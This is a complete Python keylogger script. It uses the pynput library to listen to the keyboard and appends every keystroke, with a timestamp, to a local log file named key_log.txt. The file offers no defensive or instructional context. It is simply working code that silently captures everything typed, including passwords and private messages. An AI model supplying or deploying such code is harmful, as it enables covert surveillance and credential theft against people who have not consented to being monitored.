from pynput import keyboard
import datetime
import os

LOG_FILE = os.path.join(os.path.dirname(__file__), "../key_log.txt")

def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(str(key))

def run_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    run_keylogger()
